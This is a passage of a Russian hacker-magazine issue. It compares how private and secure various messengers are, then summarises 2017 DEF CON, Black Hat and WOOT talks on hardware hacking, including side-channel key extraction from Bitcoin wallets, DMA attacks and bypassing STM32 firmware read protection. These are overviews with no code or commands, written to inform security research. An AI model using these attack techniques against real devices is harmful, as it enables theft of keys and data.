клю ча собеседником. Чтобы уведомление пришло, необходимо зайти в нас‐
тройки и вклю чить эту функцию. При старте чата никаких уведомлений нет
Запрет на скрин шоты сек ретных чатов: нет
Групповые чаты E2EE: есть
Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
повых чатах: нет
Защита социального графа: нет





WhatsApp использует Signal Protocol, но это само по себе не дает никаких
гарантий. Конечно, этот мессенджер интересен тем, что не хранит твои сооб‐
щения на своих серверах. Вмес то этого сооб щения хранятся на телефоне (а
также в облачных сервисах, с которыми он синхронизирован, например
iCloud). Также E2EE используется по умол чанию с поддержкой групповых
чатов.
  Однако хоть WhatsApp и не получает самой перепис ки, его владельцы
имеют доступ к метаданным, в том числе собирают телефонные номера
из адресной книги, время отправки сооб щений и звонков и так далее. Пред‐
ставь, что в 2:30 ты звонил в «секс по телефону» и твой разговор длил‐
ся 24 минуты. Ну да, никто не узнает, как конкретно шла беседа, но это в дан‐
ном случае не очень‐то и нужно.
  Кроме этого, WhatsApp собира ет тонны информации о пользовате ле:
модель его телефона, ОС, информацию, полученную от браузе ра, IP‐адрес,
мобильный номер и так далее.
  Добавь к этому проприетарный код, и ты получишь далеко не самый луч‐
ший с точки зрения анонимности вариант. Может, никто и не перехватит твои
сообщения, но сам мессенджер будет знать о тебе многое.


             INFO

                     Наличие сквозного шифрования — еще не гаран‐
                        тия того, что переписка не будет перех вачена.
                        Его  можно  обойти  либо  проэксплуатировать
                        какую‐то уязвимость, как это уже было в случае
                        с WhatsApp.



   BRIAR


Лицен зия: GPLv3
Сте пень цен трализации: децентра лизованный
Воз можность ано нимной регистрации и работы: есть
Наличие E2EE: есть, по умол чанию
Син хро низация E2EE-чатов: нет
Уве домление о про верке отпе чатков E2EE: при добавлении контакта
необходимо сосканировать QR‐код собеседника с экрана его телефона, дру‐
гого варианта добавить его нет. Считаем, что уведомление есть
Запрет на скрин шоты сек ретных чатов: есть
Групповые чаты E2EE: есть
Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
повых чатах: в групповой чат можно добавить только собеседника из тех,
чьи QR‐коды уже проверены. Также считаем, что уведомление есть
Защита социального графа: есть





Briar — не очень популярный мес сенджер, и готов поспорить, что далеко
не все наши читатели зна ют о его существо вании. Однако он хорош: основан
на технологии децентрализованных сетей (mesh), может работать по Blue‐
tooth или Wi‐Fi либо через интернет, но в таком случае он подключится через
Tor.
  Исходники  Briar открыты, есть воз можность анонимной регистрации
и использования, а чаты шифруются по умолчанию, причем не хранятся
на серверах Briar (то есть твои сообщения в зашифрованном виде хранятся
только на твоем телефоне). Есть защита соци аль ного графа (никто никому
не сливает твою адресную книгу), есть груп повые E2EE‐чаты, но нет синхро‐
низации  E2EE‐чатов между  устройства ми,  поскольку  нет  возможности
использовать одну и ту же учетку на разных устройствах.
  На фоне всех остальных мессенджеров Briar выглядит очень неплохо, если
нужна анонимность общения. Но у него есть и недостатки: нет версии
для iPhone, нет возможнос ти голосо вых звонков. Если с отсутстви ем звонков
еще можно мириться, то без версии для одной из крупных платформ круг
общения окажется еще более узким.



  ТАМТАМ


Лицен зия: проприетарная
Сте пень цен трализации: центра лизо ванный
Воз можность ано нимной регистрации и работы: воз можна регис тра‐
ция с использованием почты Google или через «Одноклас сники»
Наличие E2EE: нет
Защита социального графа: нет
  При создании «ТамТама» никто не делал упор на безопас ность, и об этом
нужно помнить. Внимание к нему может привлечь разве что возможность
регистрации через поч ту Google или «Одноклассники». Однако шифрование
сообщений не поддерживает ся (или раз работчики об этом не сообщают),
и нет защиты социального графа. То есть, как бы ты ни регистрировал ся,
без дополнительных мер все равно будет понятно, кто ты. В общем, даже
как замена для «Телеграма» этот мес сенджер не годится, несмотря на все
чаяния его разработчиков.


                                     Продолжение статьи →
   COVERSTORY            ← НАЧАЛО СТАТЬИ
         ШИФРУЙСЯ
           ГРАМОТНО!
            ВЫБИРАЕМ МЕССЕНДЖЕР ДЛЯ БЕЗОПАСНОЙ
                        И ПРИВАТНОЙ ПЕРЕПИСКИ





     ВКОНТАКТЕ


    Лицен зия: проприетарная
    Сте пень цен трализации: центра лизо ванный
    Воз можность ано нимной регистрации и работы: только по номеру
     телефона
    Наличие E2EE: нет
    Защита социального графа: нет
       Снова проходим мимо: вряд ли кому‐то в здравом уме при дет в голову
     мысль использовать «Вконтакте» как средство для анонимного общения.
    Сообщения хранятся на серверах соцсети, не шифруются, регистрация толь‐
     ко по номеру телефона — в общем, полный набор того, чего мы тут пытаемся
     избежать.


FACEBOOK MESSENGER


    Лицен зия: проприетарная
    Сте пень цен трализации: центра лизо ванный
    Воз можность ано нимной регистрации и работы: есть. Регистрация
     в «Фейсбуке» возможна с использованием электронной почты, а вход в Mes‐
     senger — через учетную запись Facebook
    Наличие E2EE: есть, но не по умол чанию
    Син хро низация E2EE-чатов: нет
    Уве домление о про верке отпе чатков E2EE: нет. Но собеседники могут
     сравнить отпечатки друг дру га
    Запрет на скрин шоты сек ретных чатов: нет
     Групповые чаты E2EE: нет
    Защита социального графа: нет





    Мессенджер, прилагающийся к Facebook, пос троен на основе откры того про‐
     токола MQTT. На всякий случай напомню, что это именно протокол обмена
     сообщениями — не путать с протоколом шифрования. После того как на
     мобильных телефонах Messenger выселили в отдельное приложение, у поль‐
     зователей Facebook оста валось мало выбора, кроме как установить еще и
      его. Однако регистрироваться в «Мессенджере» можно и без аккаунта в FB.
       Если сравнивать чаты «Вконтакте» и Facebook Messenger, то второй ока‐
     зывается на голову выше. Во‐первых, мож но регис трироваться с анонимной
     почтой.  Во‐вто рых, поддерживают ся  E2EE‐чаты, но не по умол чанию.
     Для  вклю чения  шифрования  сооб щений  нужно  акти вировать  Secret
      Conversations.
      Однако помни,  что Facebook собира ет очень много всевозможной
     информации о поль зователе, поэто му вряд ли подойдет для анонимного
    общения. Также не поддерживается син хро низация E2EE‐чатов и многого
     другого (см. выше). Если тебе интерес но, какую информацию собирает Face‐
      book, прочитай политику конфиденциаль ности (если у тебя нет аккаунта, то
    можно в форме скриншота).



        WIRE


    Лицен зия: GPLv3
    Сте пень цен трализации: центра лизо ванный
    Воз можность ано нимной регистрации и работы: есть. С помощью
     почты
    Наличие E2EE: есть, по умол чанию
    Син хро низация E2EE-чатов: есть
    Уве домление о про верке отпе чатков E2EE: нет, но возможность есть
    Запрет на скрин шоты сек ретных чатов: нет
     Групповые чаты E2EE: есть
    Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
    повых чатах: есть. Если один из пользователей отправляет в секретный
      групповой чат сооб щение с устройства, которое не верифицировано у дру‐
      гого пользовате ля,  то, ког да второй попыта ется отправить сообщение,
     перед ним появится предуп реждение о том, что у первого новое устройство
    Защита социального графа: есть





      Wire — один из наиболее анонимных мес сенджеров. В его основе — про‐
     токол Wire Swiss, основанный на Signal. Чем он хорош? Во‐первых, есть воз‐
     можность анонимной регистрации. Во‐вто рых, по умолчанию поддерживает‐
     ся сквозное шифрование с воз можностью синхронизации зашифрованных
      чатов. В‐третьих, есть защита социального гра фа, поддерживаются груп‐
     повые зашифрованные чаты (до 128 человек) и безопасные конференц‐звон‐
     ки (до 10 человек). Что‐то подобное мы видели в Briar, но у Wire еще и
     огромный выбор поддерживаемых платформ: Android, iOS, Windows, macOS,
       Linux.
       Должна быть ложка дегтя? Она есть: мес сенджер платный и стоит шесть
     евро в месяц (четыре при оплате за год). Раз работчики утверждают, что
     это плюс: подобная бизнес‐модель — это хоть какая‐то гарантия того, что
     на твоих данных не попытаются заработать. С другой стороны, денежные
     транзакции плохо  ладят с анонимностью. Зато  есть пробный период
     на месяц!


  JABBER (OMEMO)


    Лицен зия: разные свободные лицензии
    Сте пень цен трализации: федера тивный
    Воз можность ано нимной регистрации и работы: есть. Регистрация
     с использованием почтового ящика, учетной записи в Facebook или Twitter
    Наличие E2EE: есть. Необ ходимо допол нение OMEMO
    Син хро низация E2EE-чатов: есть
    Уве домление о про верке отпе чатков E2EE: уведомления нет, но воз‐
     можность есть
    Запрет на скрин шоты сек ретных чатов: нет
     Групповые чаты E2EE: есть
    Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
    повых чатах: нет
    Защита социального графа: нет





     Если старина Jabber и выбивается из компании современных мессендже ров
     с веселыми стикерами и голосовыми звонками, то в плане приватности он
     по‐прежнему во многом незаменим. Он федера тивный, поддерживает ано‐
     нимную  регистрацию,  E2EE‐шифрование  (правда,  нужно  расширение
    OMEMO), в том числе групповое. Да, воз можнос ти не поражают вооб‐
     ражение, но Jabber проверен временем и к тому же имеет реализации
     на всех возможных платформах. ChatSecure для iOS, Conversations — для An‐
       droid, Pidgin — для Linux и так далее, список огро мен.


    RIOT (MATRIX)


    Лицен зия: Apache
    Сте пень цен трализации: федера тивный
    Воз можность ано нимной регистрации и работы: есть
    Наличие E2EE: есть, по выбору пользователя
    Син хро низация E2EE-чатов: есть
    Уве домление о про верке отпе чатков E2EE: есть
    Запрет на скрин шоты сек ретных чатов: нет
     Групповые чаты E2EE: есть
    Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
    повых чатах: есть
    Защита социального графа: есть





     Чего создателям это го мессенджера не занимать, так это умения при думы‐
      вать крутые названия. Собственно, Matrix — это протокол коммуникации,
     а Riot — это клиентское приложение (бывают и другие — в том числе для кон‐
      соли). Использовать можно как вебовый вариант, так и программы для iOS
     и Android.
      В целом это еще один мало известный федера тивный мессенджер с под‐
     держкой и синхронизацией чатов E2EE, в том числе групповых. Регистрация
     анонимная, без привязки к номеру мобильного телефона или почте. Под‐
     держивается голосовая связь и видеозвонки.
     Шифрование переписки в Riot мож но включить или выключить — инди‐
      катором этого служит значок замочка рядом с полем отправки сообщения.
     Также если в секретном групповом чате появится пользователь, чьи устрой‐
      ства не верифицированы дру гими пользователями, собеседники увидят уве‐
     домление об этом при попытке отпра вить сооб щение.
      В целом Matrix выглядит как интерес ный вариант, сму тить может только
     его новизна в сочетании с тем, что протокол свой.


      STATUS


    Лицен зия: MPLv2
    Сте пень цен трализации: децентра лизованный
    Воз можность ано нимной регистрации и работы: есть
    Наличие E2EE: по умолчанию
    Син хро низация E2EE-чатов: час тичная (см. описание)
    Уве домление о про верке отпе чатков E2EE: есть (чтобы начать диалог
     с пользователем, необ ходимо ввести его идентификатор или сосканировать
     с экрана смартфона)
    Запрет на скрин шоты сек ретных чатов: нет
     Групповые чаты E2EE: нет
    Защита социального графа: есть
         Status — это нечто большее, чем просто мес сенджер. Конечно, его можно
     использовать только для общения, но это все равно что ставить Windows ради
     «Блокнота». Да и общать ся здесь не очень‐то удобно, даже картинку
     не отправишь, не говоря уж про такую роскошь, как стикер. Зато пря мо в чате
     есть возможность отправить ETH и соз дать запрос на его получение.
       Приложение пока находится на стадии бета‐теста. Да, без глюков пока
      никак. Установила на два телефона (Samsung и Android). На одном из телефо‐
     нов приложение работа ло нормально, на вто ром постоянно слетала авто‐
     ризация и приходилось вводить пароль при каж дом обращении к мессендже‐
     ру (считай, после каждой блокировки экра на) — не очень‐то удобно.
       Иногда не знаешь, баг перед тобой или никак не объясненная фича. Когда
     я создала аккаунты на обо их телефо нах (для этого ничего не нужно — просто
     вводи имя) и сосканиро вала QR‐код на экра не одного телефона другим,
     на втором отобразилось совершенно дру гое имя, которое я видела впер‐
     вые, — Puny Moral Gonolek. Только после добавления пользовате ля в кон‐
      такты имя стало нор маль ным. При этом имя первого собеседника всю дорогу
     отображается нормально.
       Поскольку есть возможность анонимной регис трации и все чаты шиф‐
     руются по умолчанию, мож но считать, что каж дый чат в Status — секретный.
     Есть и синхронизация секретных чатов, но син хронизироваться будут только
     входящие сообщения, а вот отправленные с одной учетной записи, но с раз‐
     ных устройств — нет.
      Еще один возможный недос таток: сообщения хранятся и на телефоне,
     и на сервере мессенджера, но разработчики уверяют, что в зашифрованном
      виде. Зато твоя книга контактов не сли вает ся на серверы мес сенджера, что
     нынче дорогого стоит. В общем, безопасность здесь есть, а возможность
     перевода криптовалюты, веро ятно, кого‐то пораду ет. Но Status пока что ско‐
     рее интересная диковинка, чем рабочий инстру мент.


     THREEMA


    Лицен зия: проприетарная для приложений, AGPLv3 для веб‐клиента
    Сте пень цен трализации: центра лизо ванный
    Воз можность ано нимной регистрации и работы: есть. Можно создать
      учетную запись без привязки к номеру телефона или почте. Пользовате лю
     присваивается уникальный ID, который можно сменить
    Наличие E2EE: есть, по умол чанию
    Син хро низация E2EE-чатов: нет: для каждого устройства генерируется
     отдельный ID
    Уве домление о про верке отпе чатков E2EE: есть. Сообщения в груп‐
     повых чатах отправляются каждому собеседнику индивидуально, а диалог
    можно начать только с тем, чей идентифика тор подтвержден
    Запрет на скрин шоты сек ретных чатов: нет
     Групповые чаты E2EE: есть
    Уве домление о необ ходимости про верки отпе чатков E2EE в груп-
    повых чатах: есть
    Защита социального графа: есть. Адресная книга по умол чанию не заг‐
     ружается на сервер, но при желании пользователь может разрешить доступ
      к ней
        Threema — проприетарный центра лизованный мессенджер, серверы
     которого находятся в Швейцарии. Кро ме тексто вого общения, пользовате‐
     лям доступны голосовые звонки, воз можность отправлять свое мес тополо‐
     жение, голосовые сооб щения и файлы. Поддерживаются групповые чаты
     до 50 человек.
      Сообщения здесь шифруются полностью и децентрализованным спо‐
     собом на устройствах пользователя, а не на сервере Threema. Сервер скорее
     играет роль ком мутатора: сообщения пересылаются через него, но не хра‐
      нятся постоянно. Подробно о том, какие данные хранятся и как дол го, ты
    можешь прочитать в FAQ.
       Для регистрации не нуж но указывать данные, которые могут способс тво‐
      вать установлению личности, — ни номер телефона, ни email. При первом
     запуске программы случайным образом генерирует ся идентификатор поль‐
     зователя, на его основе будет сгенерирован QR‐код. Все это обес печивает
     анонимность общения.
        Чтобы начать диалог с собеседником, необ ходимо ввес ти его иден‐
     тификатор. В Threema есть три уровня доверия личности пользователя.
     Наивысший будет при ска нировании идентификатора с экрана смартфона,
     а самый низкий — при вво де его вручную. Где‐то посередине находится син‐
     хронизация контактов. Уровень проверки каж дого контакта отображается
     в виде точек рядом с именем.
      В отличие от WhatsApp или, например, Facebook Messenger Threema
     не регистрирует, кто и с кем общается, и не хранит адресную книгу поль‐
     зователя на своих серверах. Все сооб щения на устройствах пользователя
     хранятся в зашифрованном виде. Спо соб шифрования зависит от устрой‐
      ства. В iOS используется функция iOS Data Protection, в Android и Windows
     Phone — AES‐256. Шифруются сообщения, изображения и другие данные,
     передаваемые между пользователями. Дополнительная информация дос‐
      тупна в whitepaper (PDF).
        Хоть каждый чат шифрует ся и может считать ся секретным, помимо этого,
     есть и приватные чаты. Они защищены PIN‐кодом и помечены значком
     со шляпой и очками. Нечто подобное мы уже встретили в Viber.
      В общем, Threema оставля ет неплохое впечатление. Сообщения не могут
     быть расшифрованы — даже по решению суда, так как хранятся только
     на телефоне и Threema не имеет доступа к секретным ключам пользователей.
    Серверы Threema знают только, кто отправляет сообщение и кому, но они
     не логируют эту информацию и не могут рас шифровать содержимое сооб‐
     щения.
       Переходим к минусам. Во‐первых, это необ ходимость разово заплатить.
      2,6 евро разово — не бог весть что, но сам факт оплаты может быть нежела‐
      тельным. Также отсутствие синхро низации и хра нения сообщений означает,
      что сохранить историю ты можешь толь ко сам, сделав бэкап.


                INFO

                             Групповые  чаты  всегда  обладают  меньшей
                             безопасностью  из‐за  упрощенного  механизма
                             распределения ключей. Подробнее читай в пре‐
                           дыдущей статье.



       ИТОГИ


     Рекомендовать какой‐либо мес сенджер мы не будем. Мы пре дос тавили тебе
     все данные, и выбор остается за тобой, тем более что выбирать есть из чего.
    Ниже — табличка, которая поможет тебе в этом.
ВЗЛОМ

  САМОЕ КРУТОЕ
   С МИРОВЫХ
 ИБ-КОНФЕРЕНЦИЙ
      ДЕСЯТЬ МОЩНЫХ ДОКЛАДОВ
      О ВЗЛОМЕ И РЕВЕРСИНГЕ
        МИКРОЭЛЕКТРОНИКИ





Если уязвимости в веб‐приложениях тебя
утомили, то взлом железа (точнее, про‐
шивок)  будет  глотком свежего  воздуха.
В этой статье мы собрали доклады, авто‐
рам которых удалось обойти защиту разных           Антон Карев                                                                                              vedacoder@mail.ru
устройств —  от  аппа ратных  кошельков
для криптовалют до электронных дверных
замков.


НЕ ЗАСЛУЖИВАЮЩЕЕ ДОВЕРИЯ ЖЕЛЕЗО И КАК ЕГО
РЕАБИЛИТИРОВАТЬ
0ctane. Untrustworthy Hardware and How to Fix It // DEF CON. 2017
  Современные вычислительные платформы предоставляют своему поль‐
зователю больше свободы, чем когда‐либо. Бум сво бод ного и open source
софта привел  к  созданию более  безопасных  крипторешений, однако
под поверхностью open source ОС расположена категоричес ки закрытая про‐
шивка и столь же закрытые коды устройств. У устройств у этих, в свою оче‐
редь, закрытая архитектура. В результате код таких ОС испещрен «бинар‐
ными блямбами» (блоками бинарного кода, представляющими собой вкрап‐
ление закрытого кода в открытый).
  Данные  обстоятельства  не  поз воляют  нам  исследовать  системы,
в которых мы ведем свои приватные вычисления, и доверять им. Встроенные
технологии, такие как Intel ME, представляют собой значительную угрозу, пос‐
кольку злоумыш ленник может легко получить к ним дос туп, эксплуатировать
их. У продвинутых зло умышленников на руках есть криптографические ключи,
которыми подписывается прошивка, и даже потенциально есть дос туп к тех‐
нологическому процессу изготовления микросхем. Такие продвинутые зло‐
умышленники  могут  повергнуть  наши  криптографичес кие  устройства,
на которые мы полагаемся в сво ей работе, в грандиозный хаос.
  После описания всевоз можных низкоуровневых атак на критические сис‐
темы докладчик представляет альтернативное решение с откры тым исходным
кодом — для уверенной криптогра фии и при ватных вычис лений. Устрой ство
построено на базе FPGA‐чипов и пред ставляет собой опенсорсную систему,
более открытую, чем какая‐либо другая дос тупная на сегод няшний день
вычислительная система. Никаких «бинарных блямб», никакой скрытой фун‐
кциональности прошивки и никаких секретных процессоров с закрытым
исходным кодом.
  Однако не стоит думать, что, придерживаясь такой концепции, можно
на 100% защититься от хакеров. Ее преимущес тво в другом — она дает
теоретическую возможность исправлять проб лемы, если они воз никнут. Тог‐
да как системы, содержащие закрытые архитектурные компоненты, такой воз‐
можности не дают в принципе.





ВЗЛОМ АППАРАТНЫХ БИТКОЙН-КОШЕЛЬКОВ
Josh Datko, Chris Quartier, Kirill Belyayev. Breaking Bitcoin Hardware
Wallets // DEF CON. 2017
  Безопасность твоих биткойнов целиком и пол ностью зависит от сек‐
ретности криптографического ключа. Аппа рат ные биткойн‐кошельки помога‐
ют защитить от атак программного уровня, которые стремятся скомпромети‐
ровать криптографический ключ. Одна ко аппаратные атаки на эти ключи изу‐
чены не так хорошо.
  В 2015 году впер вые было продемонс трировано, как извлечь секретный
ключ из TREZOR, используя простую технику ана лиза потребляемой мощ‐
ности. Хотя эта уязвимость была вско ре исправлена, микроконтрол лер,
на базе которого построен TREZOR (который, к слову говоря, тот же самый,
что и у KeepKey), уязвим и для дру гих атак по обходным каналам. В докладе
представ лен  краткий  обзор  метода  ана лиза  потребляемой мощности
и некоторых других полезных для аппаратного взлома техник, с исполь‐
зованием аппаратного опенсорсного инс трумента ChipWhisperer. Затем док‐
ладчик  объясняет,  как  раз ворачивать  эти  аппа ратные  атаки  против
STM32F205 — того самого микроконтроллера, на базе которого построены
TREZOR и KeepKey. Наконец, докладчик представляет собс твенные находки,
которые позволяют сделать новые модификации атаки по обходным каналам.
  Докладчик демонстрирует используемые в сво их иссле дованиях инстру‐
менты и методы и предос тавляет их всем заин тересованным лицам, чтобы те
могли изучить возможнос ти взло ма своих собственных биткойн‐кошельков.





ЗАЩИТНЫЙ ТОКЕН И DOOBIEKEYS: КАК ВЗЛАМЫВАЮТ
АППАРАТНЫЕ ЗАЩИТНЫЕ ДЕВАЙСЫ
Joe FitzPatrick, Michael Leibowitz. Secure Tokin’ and Doobiekeys:
How to roll your own counterfeit hardware security devices // DEF
CON. 2017
  Посмотрим правде в гла за: безопас ность софта по‐прежнему находится
в очень плачев ном состоянии. Мы, конечно, можем, прикрываясь умны ми
словами, говорить, что у нас все в порядке, но в глу бине души мы знаем, что
мир находится в огне. Даже если ты хакер — невоз можно быть уверенным,
что твой компьютер, мобильник или защищенный мессенджер не взломаны.
  Конечно, есть традиционные «эффективные» решения — аппаратные
защитные девайсы. Мы сегодня используем токены аутентификации не толь‐
ко для защиты наших систем банкинга или VPN‐соединений, но и для доступа
ко всему остальному: от облачных сервисов до социальных сетей. Хотя мы
изолировали эти «надежные» аппаратные компоненты от наших уязвимых
для взлома систем, чтобы они были более надеж ными, возможность их ком‐
прометации все же остается.
  В докладе представлены атаки против двух популярных токенов. После
создания наших модифицированных и контрафактных устройств мы можем
использовать их для  того, чтобы обойти предполагаемые предпосылки
безопасности, на которые рассчитыва ли разработчики этих аппаратных
защит и их пользователи.





АТАКА НА ШИФРОВАННЫЕ USB-КЛЮЧИ: АППАРАТНЫЙ ПОДХОД
Attacking Encrypted USB Keys: the Hard(ware) Way // Black Hat.
2017
  А ты когда‐нибудь задумывался о том, действительно ли твой новенький
AES‐шифрованный USB‐девайс шифрует данные? Или же это просто бутафо‐
рия? В этом докладе представлены результаты аудита, которые показывают,
что данные продукты не соответс твуют раз вернутой вокруг них шумихе. Сре‐
ди проанализированных девайсов многочисленные USB‐ключи и жес ткие
диски, которые претендуют на то, что они шифруют данные.
  В докладе представлена методология ана лиза «защищенных» USB‐девай‐
сов, которая вклю чает в себя комбинацию аппаратного и программного под‐
хода. В процессе анализа были найдены несколько уязвимос тей и раз‐
работаны атаки, эксплуатирующие эти уяз вимости. Описание сопровождает‐
ся практическими демонс трациями на живых при мерах. Вооружившись пре‐
доставленными в докладе зна ниями и инстру ментами, каждый может легко
и просто проанализировать безопасность любого USB‐девайса.





ВЗЛОМ ЭЛЕКТРОННЫХ ДВЕРНЫХ ЗАМКОВ: ПОЧТИ КАК В КИНО
Colin O’Flynn. Breaking Electronic Door Locks Like You’re on CSI //
Black Hat. 2017
   Киношное представление о взло ме элек тронных дверных замков ничуть
не эволюционировало со времен второго «Терминатора», в котором Джон
Коннор взламывал банкомат с помощью лэптопа. Сегодня оказывается, что
в реальности все выглядит пример но так же. :)
  В этом докладе рассмот рены нес колько широкодос тупных электронных
замков и представ лены попытки (успешные) их взлома. Докладчик подробно
объясняет, как взламывать электронику на этих замках, и описывает уяз‐
вимости, которые может экс плуатировать аппаратный хакер для обхода этих
замков. Все с демонстрацией на реальных примерах.





EVILSPLOIT — УНИВЕРСАЛЬНЫЙ ПАКЕТ ИНСТРУМЕНТОВ ДЛЯ
АППАРАТНОГО ВЗЛОМА
Chui Yew Leong, Wan Ming Ming. EvilSploit — a Universal Hardware
Hacking Toolkit // Black Hat. 2017
  Для аппаратного взло ма нужно четко понимать внутренний механизм фун‐
кционирования целевой железя ки. Как правило, процесс аппаратного взлома
начинается с реверсинга: сначала  ста тичес кого, затем динамичес кого.
С аппаратной точки зрения статический реверсинг включает в себя раскры‐
тие схемы соединений и дизас семблирова ние бинарника. Динамичес кий
реверсинг подразумевает нахождение способа под ключиться к железяке
в отладочном режиме, чтобы «демистифицировать» ее архи тектуру в полевых
условиях и затем провести фаз зинг.
  Для успешного реверсинга крайне важно идентифицировать порты дос‐
тупа исследуемой железяки. Стандартный подход для идентификации —
пакеты инструментов для поиска пинов, такие как Jtagulator. Дру гой пакет
инструментов — Shikra манипулиру ет портом ини циализации. Однако он,
во‐первых, пестрит ошибками, а во‐вто рых, не заточен под хакеров. Таким
образом, важно найти спо соб заполнить пробел между идентификацией пор‐
та и манипулиро ванием. Это позволит автоматизировать процесс аппарат‐
ного взлома и обеспечить воз можность управления этим взломом — через
скрипты, написанные на высоком неаппарат ном уровне.
  В докладе представлен новый метод для идентификации портов и для
манипулирования ими — посредством матрицы подключений (самая левая
часть картинки). Помимо всего прочего, матрица подключений — это идеаль‐
ный инструмент для анализа неизвес тных сигналов, для SCA‐атак (Side Chan‐
nel Analysis — анализ обходных каналов) и FI‐атак (Fault Injection — инъ екция
намеренных неисправностей). Идентифика цию четырех JTAG‐пинов (TMS,
TDI, TDO, TCK) из общего количес тва 16 возможных пинов EvilSploit произво‐
дит за 100 секунд. Пос ле завершения идентифика ции «матрица под клю‐
чений» автоматически перенас троит шаб лон маршрутизации сигнала —
к интерфейсной микросхеме для чипа. Теперь чип готов для управления
и  манипулирования любыми  извес тными  инстру ментами  JTAG‐отладки,
такими как UrJtag или OpenOCD.
  Для UART процедура идентификации пинов (Tx и Rx) из 16 воз можных
пинов занимает 90 секунд. Опять же, пос ле этого чип готов к управле нию
и манипулированию — любыми инстру ментами для UART‐отладки, такими
как Minicom или PuTTY. В качес тве вспомога тельного инструмента для SCA‐
атаки EvilSploit использует ChipWhisperer для вос ста новления секретного клю‐
ча для 3DES и SM4, которые используются этими чипами при шифровании.
В   обоих    случаях     EvilSploit   генерирует    триггерные    сигналы
для ChipWhisperer — для запус ка генера ции семплов и контроля потрачен‐
ного на их выполнение времени. Собранные семплы затем обрабаты ваются
супероптимизированным MatLab‐скриптом для восстановления секретного
клю ча; успешно восстанавлива ются секретные клю чи и для 3DES, и для SM4.
   Что касается проб лемы обхода схемы обна ружения, EvilSploit успешно
убеждает ее, что к управляющим пинам ничего не подключено. Таким обра‐
зом, манипуляция уровнем сигнала пол ностью доступна, даже в самых
защищенных механизмах.





DMA-АТАКИ НОВОГО ПОКОЛЕНИЯ ПРИ ПОМОЩИ ПОДДЕЛЬНОГО
КОНТРОЛЛЕРА ПАМЯТИ
Anna Trikalinou, Dan Lake. Taking DMA Attacks to the Next Level:
How to do arbitrary reads/writes in a live and unmodified system, us-
ing a rogue memory controller // Black Hat. 2017
  Доклад о том, как встра ивать аппаратные жучки в мобильные и стационар‐
ные микропроцессорные системы. Физичес кие DMA‐атаки на девайсы, а так‐
же возможность произвольного считывания и модификации содержимого
памяти в действующей и немодифицированной системе — серьезная угроза
безопасности, в особенности для мобильных устройств, которые теря ются
или воруются чаще других, и крупных дата‐центров, где имплантация недове‐
ренного компонента может быть легко упу щена из виду.
  В частности, возможность считыва ния памяти может быть использована
для считывания секретных ключей (то есть ключей шифрования диска). А воз‐
можность активной модификации памяти может быть использована для обхо‐
да политик/механизмов безопасности платформы. Однако обычно для про‐
ведения подобных атак требуется специфический интерфейс (например,
Thunderbolt), и для таких атак может быть введена смягчающая контрме ра:
блокировка связанных драйверов и портов.
  В этом докладе представлена физическая DMA‐атака нового поколения,
которую невозможно обна ружить и которая не требует доступа к определен‐
ному порту; она исполь зует архитектурную аппаратную уязвимость DIMM; эта
аппаратная уязвимость присутс твует повсеместно. Используя кастомизи‐
рованный PCB‐зонд с FPGA, хакеры смогли подклю читься к откры тым DDR4‐
пинам типичной настоль ной системы неин вазивным способом, прямо во вре‐
мя работы этой системы (находящейся в режиме сна S3). Маскируя себя
под доброкачественный контроллер памяти, хакеры могут читать и модифи‐
цировать  память  на любом  физичес ком  адресе,  и  целевая  система
при выходе из спящего режима примет все изменения.
  Докладчик делает акцент на том, как реверсили контроллер памяти
и DIMM‐схемы, чтобы затем совершать инъекции своих сигналов на шину
памяти атакуемой системы, в то время, пока сис тема находилась в режиме
сна S3. Также докладчик описывает JEDEC‐стандарт для DDR4‐команд
на поддельном контрол лере памяти; как он выполняет каждую операцию, его
временные ограничения, сопос тавление физичес ких адре сов с DDR4‐адре‐
сами. Наконец, докладчик представляет дизайн поддельного контроллера
памяти: печатной платы и FPGA.





СЧИТЫВАЕМ ЗАЩИЩЕННУЮ ОТ СЧИТЫВАНИЯ ПРОШИВКУ
Johannes Obermaier, Stefan Tatschner. Shedding too much Light
on a Microcontroller's Firmware Protection // Proceedings of the 11th
USENIX Workshop on Offensive Technologies (WOOT). 2017
   Практически все микроконтроллеры с встро енной флеш‐памятью имеют
функцию защиты прошивки от чтения. Среди них серия микроконтроллеров
STM32, которая в последнее время при обрела боль шую популярность у про‐
изводителей электроники. Неудивительно, что и ата кам она все чаще стала
подвергаться. Тем не менее практичес кого опыта и сведений об устойчивос‐
ти микроконтроллеров STM32 к ата кам в открытом доступе нет.
   Этот доклад — первое пуб личное исследование концепции безопас ности
STM32. Докладчик сначала приводит результаты концепту ального анализа
и затем раскрывает три существенных уязвимости — с демонстрацией соот‐
ветствующих этим уязвимостям атак. Во‐первых, докладчик указывает на то,
что основная конфигурация безопас ности обес печивает низ кую защиту, про‐
тив которой можно развернуть экспло ит, с исполь зованием авторского под‐
хода «пошаговой холод ной загрузки», для извлечения критических данных
или даже прошивки с защитой от считыва ния. Во‐вторых, докладчик описыва‐
ет уязвимость дизайна (в хранилище конфигура ции безопас ности), которая
позволяет злоумышленнику понизить уровень защиты прошивки, в результате
чего открывается возможность для дополнительных атак. В‐третьих, док‐
ладчик демонстрирует уязвимость в интерфейсе отладки, которая может
спровоцировать «состояние гонки», что позволяет напрямую извлекать про‐
шивку с защитой от чтения, с применением ите ративного подхода.
  Для осуществления трех описанных атак дос таточно недорогого оборудо‐
вания, из‐за чего риски воз никновения таких угроз увеличиваются в разы.
Ценового барьера для вхождения в эту игру нет.





АВТОМАТИЧЕСКИЙ РЕВЕРСИНГ ПЕЧАТНЫХ ПЛАТ
Stephan Kleber, Henrik Ferdinand Nolscher, Frank Kargl. Automated
PCB Reverse Engineering // Proceedings of the 11th USENIX Work-
shop on Offensive Technologies (WOOT). 2017
   Анализ безопасности встроенного устройства, о внутренней архитектуре
которого сведения недоступны, начина ется с реверсинга печатной платы.
Результатом такого ревер синга будет список компонентов,  техническая
документация на эти компоненты и схематичес кая реконс трукция, которая
иллюстрирует основные соединения между компонентами печатной платы.
  Не найдя бюджетных методов для эффективного реверсинга печатных
плат, группа иссле дователей предложила новый фреймворк, который фор‐
мализует и автоматизиру ет большинство дей ствий, необходимых при ревер‐
синге печатных плат. Этот фреймворк автомати чески обнаруживает ком‐
поненты (при помощи машинного зрения), собира ет техническую докумен‐
тацию из интернета и анализирует техничес кие документы для извле чения
